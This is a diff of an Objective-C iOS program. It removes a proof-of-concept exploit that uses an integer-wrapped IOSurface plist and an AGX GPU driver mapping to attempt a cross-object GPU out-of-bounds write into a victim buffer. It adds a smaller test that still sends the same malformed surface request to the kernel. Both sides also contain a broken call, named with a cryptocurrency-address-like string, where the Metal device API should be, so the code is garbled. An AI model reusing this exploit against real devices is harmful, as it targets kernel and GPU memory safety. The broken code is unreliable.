@@ -1,280 +1,62 @@
 #import <Foundation/Foundation.h>
 #import <Metal/Metal.h>
 #import <IOKit/IOKitLib.h>
-#import <mach/mach.h>
-#import <dlfcn.h>
-
-// MARK: - Dynamic IOSurface Loading
-
-typedef uint32_t (*IOSurfaceCreateFunc)(CFDictionaryRef properties);
-typedef void *(*IOSurfaceLockFunc)(uint32_t surface_id, uint32_t options, uint32_t *seed);
-typedef void *(*IOSurfaceUnlockFunc)(uint32_t surface_id, uint32_t options, uint32_t *seed);
-typedef void *(*IOSurfaceGetBaseAddressFunc)(uint32_t surface_id);
-typedef size_t (*IOSurfaceGetAllocSizeFunc)(uint32_t surface_id);
-typedef uint32_t (*IOSurfaceGetIDFunc)(void *surface);
-
-static void *g_iosurface_handle = NULL;
-static IOSurfaceCreateFunc g_iosurface_create = NULL;
-static IOSurfaceLockFunc g_iosurface_lock = NULL;
-static IOSurfaceUnlockFunc g_iosurface_unlock = NULL;
-static IOSurfaceGetBaseAddressFunc g_iosurface_get_base = NULL;
-static IOSurfaceGetAllocSizeFunc g_iosurface_get_size = NULL;
-
-static int load_iosurface(void) {
-    // Try multiple paths
-    const char *paths[] = {
-        "/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface",
-        "/System/Library/Frameworks/IOSurface.framework/IOSurface",
-        NULL
-    };
-    
-    for (int i = 0; paths[i]; i++) {
-        g_iosurface_handle = dlopen(paths[i], RTLD_NOW | RTLD_GLOBAL);
-        if (g_iosurface_handle) {
-            NSLog(@"[OK] Loaded IOSurface from: %s", paths[i]);
-            break;
-        }
-    }
-    
-    if (!g_iosurface_handle) {
-        NSLog(@"[ERROR] Cannot load IOSurface: %s", dlerror());
-        return -1;
-    }
-    
-    // Load functions
-    g_iosurface_create = (IOSurfaceCreateFunc)dlsym(g_iosurface_handle, "IOSurfaceCreate");
-    g_iosurface_lock = (IOSurfaceLockFunc)dlsym(g_iosurface_handle, "IOSurfaceLock");
-    g_iosurface_unlock = (IOSurfaceUnlockFunc)dlsym(g_iosurface_handle, "IOSurfaceUnlock");
-    g_iosurface_get_base = (IOSurfaceGetBaseAddressFunc)dlsym(g_iosurface_handle, "IOSurfaceGetBaseAddress");
-    g_iosurface_get_size = (IOSurfaceGetAllocSizeFunc)dlsym(g_iosurface_handle, "IOSurfaceGetAllocSize");
-    
-    if (!g_iosurface_create) {
-        NSLog(@"[ERROR] Cannot find IOSurfaceCreate");
-        return -1;
-    }
-    
-    NSLog(@"[OK] IOSurface functions loaded");
-    return 0;
-}
-
-// MARK: - F1 Surface Creation via IOKit
-
-static uint32_t create_f1_surface_iokit(void) {
-    // Open IOSurfaceRoot service (IOKit is public)
-    io_service_t iosurface_root = IOServiceGetMatchingService(kIOMasterPortDefault,
-        IOServiceMatching("IOSurfaceRoot"));
-    if (!iosurface_root) {
-        NSLog(@"[ERROR] IOSurfaceRoot not found");
-        return 0;
-    }
-    
-    io_connect_t conn = 0;
-    kern_return_t kr = IOServiceOpen(iosurface_root, mach_task_self(), 0, &conn);
-    IOObjectRelease(iosurface_root);
-    if (kr != KERN_SUCCESS) {
-        NSLog(@"[ERROR] IOServiceOpen failed: %x", kr);
-        return 0;
-    }
-    
-    // F1 XML with 32-bit integer wrap
-    const char *xml =
-        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
-        "<plist version=\"1.0\">"
-        "<dict>"
-        "    <key>IOSurfaceIsGlobal</key>"
-        "    <true/>"
-        "    <key>IOSurfacePixelFormat</key>"
-        "    <integer>1111970369</integer>"
-        "    <key>IOSurfaceWidth</key>"
-        "    <integer>256</integer>"
-        "    <key>IOSurfaceHeight</key>"
-        "    <integer>256</integer>"
-        "    <key>IOSurfaceBytesPerElement</key>"
-        "    <integer>4</integer>"
-        "    <key>IOSurfaceBytesPerRow</key>"
-        "    <integer>1024</integer>"
-        "    <key>IOSurfaceAllocSize</key>"
-        "    <integer>65536</integer>"
-        "    <key>IOSurfacePlaneSize</key>"
-        "    <integer>65536</integer>"
-        "    <key>IOSurfacePlaneCount</key>"
-        "    <integer>1</integer>"
-        "    <key>IOSurfacePlaneDataRegionBytesPerSlice</key>"
-        "    <integer>16384</integer>"
-        "    <key>IOSurfacePlaneHeaderRegionBytesPerSlice</key>"
-        "    <integer>1073741824</integer>"
-        "    <key>IOSurfaceSliceCount</key>"
-        "    <integer>4</integer>"
-        "</dict>"
-        "</plist>";
-    
-    uint32_t surface_id = 0;
-    size_t xml_len = strlen(xml) + 1;
-    kr = IOConnectCallMethod(conn, 0, NULL, 0, xml, xml_len, NULL, NULL, &surface_id, NULL);
-    IOServiceClose(conn);
-    
-    if (kr != KERN_SUCCESS) {
-        NSLog(@"[ERROR] Surface creation failed: %x", kr);
-        return 0;
-    }
-    
-    NSLog(@"[OK] F1 surface created via IOKit: ID %u", surface_id);
-    return surface_id;
-}
-
-// MARK: - AGX Mapping
-
-static uint64_t agx_map_surface(uint32_t surface_id, uint64_t *span, io_connect_t *agx_conn) {
-    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault,
-        IOServiceMatching("AGXAcceleratorG18P"));
-    if (!agx) {
-        agx = IOServiceGetMatchingService(kIOMasterPortDefault,
-            IOServiceMatching("AGXAcceleratorG14P"));
-    }
-    if (!agx) {
-        NSLog(@"[ERROR] AGXAccelerator not found");
-        return 0;
-    }
-    
-    io_connect_t conn = 0;
-    kern_return_t kr = IOServiceOpen(agx, mach_task_self(), 1, &conn);
-    IOObjectRelease(agx);
-    if (kr != KERN_SUCCESS) {
-        NSLog(@"[ERROR] AGX open failed: %x", kr);
-        return 0;
-    }
-    
-    uint64_t input[2] = {surface_id, 0x82};
-    uint64_t output[2] = {0};
-    uint32_t output_cnt = 2;
-    
-    kr = IOConnectCallMethod(conn, 8, input, 2, NULL, 0, output, &output_cnt, NULL, NULL);
-    
-    if (kr != KERN_SUCCESS) {
-        NSLog(@"[ERROR] AGX map failed: %x", kr);
-        IOServiceClose(conn);
-        return 0;
-    }
-    
-    *span = output[1];
-    *agx_conn = conn;
-    NSLog(@"[OK] AGX mapped: VA 0x%llx, span 0x%llx", output[0], output[1]);
-    return output[0];
-}
-
-// MARK: - Cross-Object OOB Write
-
-static int test_cross_object_write(void) {
-    NSLog(@"=== F1OOB Runtime Loading PoC ===");
-    
-    // Try loading IOSurface dynamically
-    if (load_iosurface() != 0) {
-        NSLog(@"[*] Falling back to pure IOKit method");
-    }
-    
-    // Create F1 surface via IOKit (no headers needed)
-    uint32_t surface_id = create_f1_surface_iokit();
-    if (!surface_id) return -1;
-    
-    // Map to AGX
-    uint64_t span = 0;
-    io_connect_t agx_conn = 0;
-    uint64_t f1_gpu_va = agx_map_surface(surface_id, &span, &agx_conn);
-    if (!f1_gpu_va) return -1;
-    
-    // Create Metal device
-    id<MTLDevice> dev = ltc1qalrd99hju33uagsf8927k7xfxr423gr93gnjz8();
-    if (!dev) {
-        NSLog(@"[ERROR] No Metal device");
-        return -1;
-    }
-    
-    // Create F1 Metal buffer (64KB wrapper)
-    void *f1_base = malloc(0x10000);
-    memset(f1_base, 0x41, 0x10000);
-    
-    id<MTLBuffer> f1_buf = [dev newBufferWithBytesNoCopy:f1_base
-                                                  length:0x10000
-                                                 options:MTLResourceStorageModeShared
-                                             deallocator:nil];
-    if (!f1_buf) {
-        NSLog(@"[ERROR] F1 buffer creation failed");
-        return -1;
-    }
-    
-    uint64_t f1_ga = (uint64_t)f1_buf.gpuAddress;
-    NSLog(@"[METAL] F1 buffer GPU address: 0x%llx", f1_ga);
-    
-    // Create victim buffer after F1
-    id<MTLBuffer> victim = [dev newBufferWithLength:0x10000
-                                            options:MTLResourceStorageModeShared];
-    if (!victim) {
-        NSLog(@"[ERROR] Victim buffer creation failed");
-        return -1;
-    }
-    
-    uint64_t victim_ga = (uint64_t)victim.gpuAddress;
-    NSLog(@"[METAL] Victim buffer GPU address: 0x%llx", victim_ga);
-    
-    if (victim_ga <= f1_ga) {
-        NSLog(@"[ERROR] Victim not after F1");
-        return -1;
-    }
-    
-    uint64_t delta = victim_ga - f1_ga;
-    NSLog(@"[XOBJ] delta=0x%llx span=0x%llx", delta, span);
-    
-    if (delta >= span) {
-        NSLog(@"[XOBJ] Victim out of F1 span — no hit possible");
-        return 0;
-    }
-    
-    // Pre-touch victim
-    uint32_t *victim_ptr = (uint32_t *)victim.contents;
-    *victim_ptr = 0x47474747;
-    NSLog(@"[METAL] Victim pre-touched: 0x%x", *victim_ptr);
-    
-    // Write through F1 buffer at victim's GPU address
-    uint32_t *f1_ptr = (uint32_t *)f1_buf.contents;
-    uint64_t idx = delta / 4;
-    f1_ptr[idx] = 0x43434343;
-    
-    NSLog(@"[METAL] Wrote through F1 at index %llu", idx);
-    
-    // Check victim
-    uint32_t back = *victim_ptr;
-    if (back == 0x43434343) {
-        NSLog(@"[XOBJ] *** CROSS-OBJECT GPU OOB WRITE CONFIRMED ***");
-        return 1;
-    } else {
-        NSLog(@"[XOBJ] No cross-object hit (victim=0x%x)", back);
-        return 0;
-    }
-}
-
-// MARK: - Main
 
 int main(int argc, char *argv[]) {
     @autoreleasepool {
-        int result = test_cross_object_write();
+        NSLog(@"=== F1OOB Minimal Test ===");
         
-        NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
-        NSString *logPath = [docs stringByAppendingPathComponent:@"F1OOB_result.log"];
+        // Test 1: Open IOSurfaceRoot
+        io_service_t iosurface_root = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        if (!iosurface_root) {
+            NSLog(@"[FAIL] IOSurfaceRoot not found");
+            return -1;
+        }
+        NSLog(@"[OK] IOSurfaceRoot found");
         
-        NSString *log = [NSString stringWithFormat:
-            @"F1OOB Runtime Loading Result: %d\n"
-            @"Device: %@\n"
-            @"iOS: %@\n"
-            @"Time: %@\n",
-            result,
-            [[UIDevice currentDevice] model],
-            [[UIDevice currentDevice] systemVersion],
-            [NSDate date]];
+        // Test 2: Open service
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(iosurface_root, mach_task_self(), 0, &conn);
+        IOObjectRelease(iosurface_root);
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"[FAIL] IOServiceOpen failed: %x", kr);
+            return -1;
+        }
+        NSLog(@"[OK] IOServiceOpen success");
         
-        [log writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
-        NSLog(@"[OK] Log written to: %@", logPath);
+        // Test 3: Create surface with F1 XML
+        const char *xml =
+            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+            "<plist version=\"1.0\"><dict>"
+            "<key>IOSurfaceIsGlobal</key><true/>"
+            "<key>IOSurfaceWidth</key><integer>256</integer>"
+            "<key>IOSurfaceHeight</key><integer>256</integer>"
+            "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
+            "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
+            "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
+            "<key>IOSurfaceSliceCount</key><integer>4</integer>"
+            "</dict></plist>";
         
-        return result;
+        uint32_t surface_id = 0;
+        kr = IOConnectCallMethod(conn, 0, NULL, 0, xml, strlen(xml)+1, NULL, NULL, &surface_id, NULL);
+        IOServiceClose(conn);
+        
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"[FAIL] Surface creation failed: %x", kr);
+            return -1;
+        }
+        NSLog(@"[OK] F1 surface created: ID %u", surface_id);
+        
+        // Test 4: Metal device
+        id<MTLDevice> dev = ltc1qalrd99hju33uagsf8927k7xfxr423gr93gnjz8();
+        if (!dev) {
+            NSLog(@"[FAIL] No Metal device");
+            return -1;
+        }
+        NSLog(@"[OK] Metal device created");
+        
+        NSLog(@"[DONE] All tests passed");
+        return 0;
     }
 }
